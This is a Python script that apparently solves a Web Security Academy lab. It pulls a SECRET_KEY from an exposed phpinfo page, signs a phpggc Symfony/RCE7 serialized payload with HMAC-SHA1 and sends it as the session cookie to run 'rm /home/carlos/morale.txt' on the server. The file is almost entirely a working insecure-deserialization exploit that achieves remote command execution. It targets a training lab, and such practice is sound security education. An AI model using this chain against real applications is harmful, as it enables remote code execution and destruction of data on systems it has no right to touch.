from web_security_academy.core.logger import logger
from urllib.parse import quote
from hashlib import sha1

import hmac
import re


def solve_lab(session):
    logger.info("Extracting debug info at /cgi-bin/phpinfo.php...")
    resp = session.get_path("/cgi-bin/phpinfo.php")
    match = re.search(
        r'<tr><td class="e">SECRET_KEY </td><td class="v">(.*)</td></tr>', resp.text
    )
    if match is None:
        logger.failure("Unable to extract SECRET_KEY.")
        return
    else:
        secret_key = match.group(1).strip()
        logger.success(f"SECRET_KEY: {secret_key}")

    logger.debug(
        "Payload generated by command `phpggc -b 'Symfony/RCE7' 'system' 'rm /home/carlos/morale.txt'`:"
    )
    payload = (
        "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6"
        "e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk"
        "ZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6NjE6IgBTeW1mb255"
        "XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBnZXRUYWdzQnlLZXkiO3M6"
        "Njoic3lzdGVtIjt9="
    )
    logger.debug(f"Payload: {payload}")

    logger.debug("Getting the HMAC-SHA1 hash of payload using SECRET_KEY:")
    hmac_sha1 = hmac.new(secret_key.encode(), payload.encode(), sha1).digest().hex()
    logger.debug(f"HMAC-SHA1 Hash: {hmac_sha1}")

    cookie = '{"token":"' + payload + '","sig_hmac_sha1":"' + hmac_sha1 + '"}'
    session.cookies.clear_session_cookies()
    session.cookies.set("session", quote(cookie))

    logger.info("Revisiting the lab with the following cookie:")
    logger.info(cookie)
    session.get_path("/")
